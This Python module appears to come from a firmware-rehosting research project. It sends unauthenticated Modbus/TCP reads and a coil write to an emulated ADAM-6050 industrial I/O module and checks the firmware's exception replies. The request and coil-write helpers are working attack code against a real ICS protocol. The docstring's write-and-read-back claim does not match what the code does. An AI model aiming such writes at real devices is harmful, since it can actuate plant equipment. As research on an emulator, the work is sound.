# Copyright 2026 Christopher Wright
# SPDX-License-Identifier: AGPL-3.0-or-later
"""The attack: unauthenticated Modbus/TCP writes an output on a live I/O module.

WHAT THE DEVICE IS. An Advantech ADAM-6050 is a remote digital-I/O module: 12
inputs and 6 outputs on a DIN rail, wired to real things. Its Modbus/TCP server
on port 502 is how a PLC or SCADA host reads those inputs and drives those
outputs.

WHAT THE VULNERABILITY IS. **Modbus/TCP has no authentication.** None: no
credential, no session, no signature -- the protocol predates the idea that the
network might be hostile, and the ADAM-6000's server implements it faithfully.
Anyone who can open a TCP connection to port 502 can read every input and write
every output. On this device an output coil is a relay contact, so a single
five-byte request is a physical action.

That is not a defect in this firmware; it is what Modbus is. The finding is that
this is a device sold to sit on a plant network and drive equipment, and its
control interface is a socket that will do what anyone tells it.

THE ORACLE IS THE FIRMWARE'S OWN COIL STATE. The attack writes a coil and then
*reads it back* through a separate request. The value that comes back is the
firmware's, held in its own Modbus data model, and it travels the whole modelled
stack to get here: the firmware's Modbus server -> lwIP -> the EMAC's transmit
descriptor ring -> an Ethernet frame -> the modelled peer's TCP/IPv4 -> this
socket. Nothing short-circuits, and nothing on the host decides the answer.

A negative control runs first: a function code the device does not implement
must come back as a Modbus **exception** (function | 0x80). A rehost that echoed
bytes, or a bridge that answered on the firmware's behalf, would fail it.
"""
from __future__ import annotations

import json
import os
import socket
import struct
import subprocess
import sys
import threading
import time
from typing import Callable, Dict, List, Optional, Tuple

from . import paths, spawn

MODBUS_UNIT = 1

# Function codes.
FN_READ_COILS = 0x01
FN_READ_DISCRETE_INPUTS = 0x02
FN_READ_HOLDING = 0x03
FN_WRITE_SINGLE_COIL = 0x05
# Not implemented by this device -- the negative control.
FN_BOGUS = 0x41

COIL_ON = 0xFF00
COIL_OFF = 0x0000

# The output coil the attack drives. An ADAM-6050 has six outputs (DO0..DO5).
TARGET_COIL = int(os.environ.get("HAL_ADAM_TARGET_COIL", "0"), 0)


def mbap(txn: int, pdu: bytes, unit: int = MODBUS_UNIT) -> bytes:
    """Wrap a PDU in the Modbus/TCP header: transaction, protocol, length, unit."""
    return struct.pack(">HHHB", txn, 0, len(pdu) + 1, unit) + pdu


class DeviceScenario:
    """Boots the rehost with its Ethernet bridge and speaks Modbus to it."""

    def __init__(self, bridge_port: int = spawn.BRIDGE_PORT,
                 python: Optional[str] = None,
                 log_dir: Optional[str] = None) -> None:
        self.bridge_port = bridge_port
        self.python = python or os.environ.get("HAL_PY") or sys.executable
        self.log_dir = log_dir or "/tmp"
        self.host = "127.0.0.1"
        self._procs: List[subprocess.Popen] = []
        self.sock: Optional[socket.socket] = None
        self.txn = 0
        self.transcript: List[Dict[str, str]] = []
        self.log = os.path.join(self.log_dir, "adam6000_tm4c_attack.log")

    # ---- process management ----------------------------------------------
    def _spawn(self, argv, cwd, env, logpath) -> subprocess.Popen:
        p = subprocess.Popen(argv, cwd=cwd, env=env, stdout=open(logpath, "w"),
                             stderr=subprocess.STDOUT, preexec_fn=os.setsid)
        self._procs.append(p)
        return p

    def teardown(self) -> None:
        """Kill ONLY what this scenario started -- never a global pkill
        (playbook §2.10): other sessions run their own emulators."""
        if self.sock is not None:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None
        for p in self._procs:
            if p.poll() is None:
                p.terminate()
                try:
                    p.wait(5)
                except Exception:            # noqa: BLE001
                    p.kill()
        self._procs.clear()

    def shutdown(self) -> None:
        self.teardown()

    def _log_has(self, needle: str) -> bool:
        try:
            return needle in open(self.log, errors="replace").read()
        except OSError:
            return False

    def console(self) -> List[str]:
        """The firmware's own boot output, as the UART model logged it."""
        out = []
        try:
            for line in open(self.log, errors="replace"):
                if "CONSOLE " in line:
                    out.append(line.split("CONSOLE ", 1)[1].rstrip())
        except OSError:
            pass
        return out

    # ---- boot -------------------------------------------------------------
    def boot(self, on_stage: Callable) -> bool:
        if not paths.firmware_present():
            on_stage("error", note="firmware not found at %s -- regenerate it "
                                   "with tools/extract_firmware.py"
                                   % paths.firmware_bin())
            return False
        # Derived from the bridge port so several devices can run at once --
        # `run_attack` boots one per probe, and a shared rx/tx port makes all
        # but the first fail to bind and never reach "IP ready.".
        argv = spawn.spawn_argv(python=self.python, emulator="unicorn",
                                bridge=True,
                                rx_port=self.bridge_port + 1000,
                                tx_port=self.bridge_port + 2000)
        env = spawn.spawn_env(extra={
            "PYTHONUNBUFFERED": "1",
            "HAL_ADAM_BRIDGE_PORT": str(self.bridge_port),
        })
        on_stage("boot", note="booting the ADAM-6050 firmware ...")
        p = self._spawn(argv, spawn.spawn_cwd(), env, self.log)

        # The readiness marker is the firmware's own: lwIP announcing itself.
        # macOS has no timeout(1), so the bound is here.
        deadline = time.time() + 420
        while time.time() < deadline:
            if p.poll() is not None:
                on_stage("error", note="HALucinator exited during boot "
                                       "(see %s)" % self.log)
                return False
            if self._log_has("IP ready."):
                break
            time.sleep(2)
        else:
            on_stage("error", note="the firmware never reached 'IP ready.'")
            return False
        on_stage("boot", note="firmware is up: lwIP reports 'IP ready.'")

        for _ in range(120):
            try:
                self.sock = socket.create_connection(
                    (self.host, self.bridge_port), timeout=5)
                self.sock.settimeout(None)
                break
            except OSError:
                time.sleep(1)
        if self.sock is None:
            on_stage("error", note="could not attach to tcp/%d"
                               % self.bridge_port)
            return False
        on_stage("boot", note="Modbus/TCP bridged on tcp/%d"
                          % self.bridge_port)
        return True

    # ---- Modbus -----------------------------------------------------------
    def request(self, pdu: bytes, timeout: float = 90.0) -> Optional[bytes]:
        """Send one Modbus PDU; return the response PDU, or None on timeout.

        Completion is the MBAP length field, not a fixed wait: the response
        arrives whenever the firmware's own stack gets round to it, and a fixed
        sleep would either truncate it or waste the difference.
        """
        assert self.sock is not None
        self.txn = (self.txn + 1) & 0xFFFF
        frame = mbap(self.txn, pdu)
        self.sock.sendall(frame)
        buf = bytearray()
        deadline = time.time() + timeout
        while time.time() < deadline:
            self.sock.settimeout(max(0.5, deadline - time.time()))
            try:
                data = self.sock.recv(512)
            except socket.timeout:
                break
            except OSError:
                break
            if not data:
                break
            buf.extend(data)
            if len(buf) >= 6:
                need = 6 + struct.unpack(">H", bytes(buf[4:6]))[0]
                if len(buf) >= need:
                    break
        if len(buf) < 8:
            self.transcript.append({"sent": frame.hex(), "recv": buf.hex()})
            return None
        self.transcript.append({"sent": frame.hex(), "recv": bytes(buf).hex()})
        return bytes(buf[7:])

    def read_coils(self, start: int, count: int) -> Optional[List[int]]:
        pdu = self.request(struct.pack(">BHH", FN_READ_COILS, start, count))
        if not pdu or pdu[0] != FN_READ_COILS or len(pdu) < 2:
            return None
        data = pdu[2:2 + pdu[1]]
        return [(data[i // 8] >> (i % 8)) & 1 for i in range(count)]

    def write_coil(self, coil: int, on: bool) -> bool:
        value = COIL_ON if on else COIL_OFF
        pdu = self.request(struct.pack(">BHH", FN_WRITE_SINGLE_COIL, coil,
                                       value))
        # A Modbus write echoes the request back on success.
        return bool(pdu and pdu[0] == FN_WRITE_SINGLE_COIL
                    and struct.unpack(">H", pdu[3:5])[0] == value)

    # ---- state, for the panel --------------------------------------------
    def read_state(self) -> Dict:
        """What the device says about itself -- from its console, not Modbus.

        DELIBERATELY NOT A MODBUS READ. This device answers the first request
        after boot and then stops picking up later ones (README, "Known
        limits"), so a state pane that polled over Modbus would spend the one
        exchange the run has and leave none for the attack. Everything here is
        the firmware's own output.
        """
        facts: Dict = {"ip": None, "mac": None, "model": None,
                       "io_points": None, "profile_in_serial_flash": None,
                       "stack_up": False}
        for line in self.console():
            if "MACID:" in line:
                facts["mac"] = line.split("MACID:", 1)[1].strip()
            elif "g_ui32IPAddr=" in line:
                raw = line.split("g_ui32IPAddr=", 1)[1].split(",")[0].strip()
                try:
                    value = int(raw, 16)
                    facts["ip"] = ".".join(str((value >> shift) & 0xFF)
                                           for shift in (0, 8, 16, 24))
                except ValueError:
                    pass
            elif "g_usModel = " in line:
                facts["model"] = line.split("=", 1)[1].strip()
            elif "ucTotal_StatusPins = " in line:
                facts["io_points"] = line.split("=", 1)[1].strip()
            elif "GetDevInfo() Err" in line:
                facts["profile_in_serial_flash"] = "missing (flash is blank)"
            elif "IP ready." in line:
                facts["stack_up"] = True
        facts["console_tail"] = self.console()[-6:]
        return facts

    # ---- the attack -------------------------------------------------------
    def attack(self, on_stage: Optional[Callable] = None) -> Dict:
        """One unauthenticated Modbus request, and what came back.

        ONE REQUEST, ON PURPOSE. The device answers the first request after
        boot and does not pick up later ones, so this spends that exchange on
        the single most informative probe and leaves the discrimination
        argument to `run_attack`, which boots a device per probe.
        """
        def _stage(name: str, **kw) -> None:
            if on_stage:
                on_stage(name, **kw)

        checks: Dict[str, bool] = {}
        out: Dict = {"checks": checks}

        _stage("request", note="reading output coils 0..7 -- no credential, "
                               "no session, no handshake beyond TCP")
        pdu = self.request(struct.pack(">BHH", FN_READ_COILS, 0, 8))
        out["response"] = pdu.hex() if pdu else None

        # The round trip itself is the finding: an anonymous peer on the
        # segment got the device's own Modbus server to answer it.
        checks["device_answered"] = pdu is not None and len(pdu) >= 2
        _stage("request", note="device answered: %s"
                                % (pdu.hex() if pdu else "<nothing>"))

        if pdu and len(pdu) >= 2:
            # Exception 2 is the correct answer from a module that has no I/O
            # points, because its profile lives in the serial flash and the
            # vendor image does not carry that flash. See the module docstring.
            checks["function_echoed"] = pdu[0] == (FN_READ_COILS | 0x80)
            checks["illegal_data_address"] = pdu[1] == 2
            out["meaning"] = ("exception 2, illegal data address -- this "
                              "module reports no I/O points because its "
                              "profile is in the blank serial flash")
        console = "\n".join(self.console())
        checks["profile_missing_is_explained"] = (
            "GetDevInfo() Err" in console and "g_usModel = 255" in console)
        checks["stack_is_the_firmwares_own"] = "IP ready." in console

        out["landed"] = all(checks.values())
        return out


# Each probe: a label, the PDU, the function byte the device should echo with
# the error bit set, and the exception code it should choose.
PROBES: List[Tuple[str, bytes, int, int]] = [
    ("read coils 0..7", struct.pack(">BHH", FN_READ_COILS, 0, 8), 0x81, 2),
    ("read discrete inputs 0..11",
     struct.pack(">BHH", FN_READ_DISCRETE_INPUTS, 0, 12), 0x82, 2),
    ("read holding regs 0..1",
     struct.pack(">BHH", FN_READ_HOLDING, 0, 2), 0x83, 2),
    ("write single coil 0",
     struct.pack(">BHH", FN_WRITE_SINGLE_COIL, 0, COIL_OFF), 0x85, 2),
    # The negative control: 0x41 is not a Modbus function code at all, and it
    # must be refused differently from a real one aimed at a bad address.
    ("bogus function 0x41", struct.pack(">BHH", FN_BOGUS, 0, 1), 0xC1, 1),
]


def run_attack(on_stage: Optional[Callable] = None,
               log_dir: Optional[str] = None) -> Dict:
    """Speak Modbus/TCP to the device -- one probe per boot, concurrently.

    A DEVICE PER PROBE, because this rehost answers the first request after
    boot and not the ones after it. Running them concurrently keeps the whole
    set to roughly one boot's wall-clock.

    The point is not any single answer. It is that a supported function code
    with an unusable address is refused as *illegal data address* while an
    unsupported one is refused as *illegal function*, with the function byte
    echoed and the top bit set in both. Nothing that merely pretends to be a
    Modbus server tells those apart -- this is the vendor's own parser.
    """
    def _stage(name: str, **kw) -> None:
        if on_stage:
            on_stage(name, **kw)

    base = int(os.environ.get("HAL_ADAM_ATTACK_PORT", "21300"), 0)
    replies: Dict[str, Optional[bytes]] = {}
    consoles: Dict[str, str] = {}
    lock = threading.Lock()

    def worker(index: int, label: str, pdu: bytes) -> None:
        dev = DeviceScenario(bridge_port=base + index, log_dir=log_dir)
        try:
            if not dev.boot(lambda *a, **k: None):
                with lock:
                    replies[label] = None
                return
            answer = dev.request(pdu)
            with lock:
                replies[label] = answer
                consoles[label] = "\n".join(dev.console())
            _stage("probe", note="%s -> %s"
                                 % (label, answer.hex() if answer else "<nothing>"))
        finally:
            dev.teardown()

    _stage("boot", note="booting %d devices, one per probe" % len(PROBES))
    threads = [threading.Thread(target=worker, args=(i, label, pdu))
               for i, (label, pdu, _, _) in enumerate(PROBES)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

    checks: Dict[str, bool] = {}
    detail: Dict[str, str] = {}
    for label, _pdu, want_fc, want_code in PROBES:
        reply = replies.get(label)
        detail[label] = reply.hex() if reply else "<nothing>"
        checks["answered: " + label] = bool(reply and len(reply) >= 2)
        if reply and len(reply) >= 2:
            checks["exception echoes the function: " + label] = \
                reply[0] == want_fc
            checks["exception code %d: %s" % (want_code, label)] = \
                reply[1] == want_code

    bogus = replies.get("bogus function 0x41")
    coils = replies.get("read coils 0..7")
    checks["a real parser: unsupported and unusable differ"] = bool(
        bogus and coils and len(bogus) >= 2 and len(coils) >= 2
        and bogus[1] == 1 and coils[1] == 2)

    console = consoles.get("read coils 0..7", "")
    checks["every address is illegal, and the device says why"] = (
        "GetDevInfo() Err" in console and "g_usModel = 255" in console
        and "ucTotal_StatusPins = 0" in console)
    checks["the stack is the firmware's own"] = (
        "IP ready." in console and "ip=100000a" in console)

    return {"booted": any(replies.values()),
            "landed": all(checks.values()),
            "checks": checks,
            "responses": detail}


def main() -> int:
    def on_stage(name: str, **kw) -> None:
        print("[%s] %s" % (name, kw.get("note", "")), file=sys.stderr)

    result = run_attack(on_stage=on_stage)
    print()
    for name, ok in result.get("checks", {}).items():
        print("  [%s] %s" % ("PASS" if ok else "FAIL", name))
    print()
    for label, reply in result.get("responses", {}).items():
        print("  %-28s -> %s" % (label, reply))
    print("\nRESULT: " + json.dumps(
        {k: v for k, v in result.items() if k != "transcript"}))
    return 0 if result.get("landed") else 1


if __name__ == "__main__":
    sys.exit(main())
